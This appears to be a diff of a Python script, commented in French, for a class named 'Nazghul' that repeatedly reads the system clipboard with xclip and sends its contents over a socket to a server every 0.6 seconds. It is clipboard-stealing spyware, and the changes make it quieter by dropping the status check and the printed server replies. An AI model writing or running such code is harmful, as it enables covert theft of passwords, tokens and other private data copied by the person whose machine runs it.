@@ -19,19 +19,17 @@ except Exception as e:
 class Nazghul():
     def __init__(self):
         # On fait appel à la commande système xclip, on verifie son etat et si == 0  on sauvegarde le presse papier dans une variable qu'on envois au serveur après l'avoir encoder en une chaine de bytes.
-        if os.system('xclip -o 2>/dev/null' ) == 0:
-            presse_papier= os.popen('xclip -o 2>/dev/null' ).readlines()
-            presse_papier= str(presse_papier)
-            self.msg_a_envoyer = presse_papier.encode()
+#        if os.system('xclip -o 2>/dev/null' ) == 0:
+        presse_papier= os.popen('xclip -o 2>/dev/null' ).readlines()
+        presse_papier= str(presse_papier)
+        self.msg_a_envoyer = presse_papier.encode()
+
            
 while 1:
     obj=Nazghul()
     # On envoie le message
     connexion_avec_serveur.send(obj.msg_a_envoyer)
     msg_recu = connexion_avec_serveur.recv(1024)
-    print(msg_recu.decode()) 
     time.sleep(0.6) 
-
-
 
 connexion_avec_serveur.close()
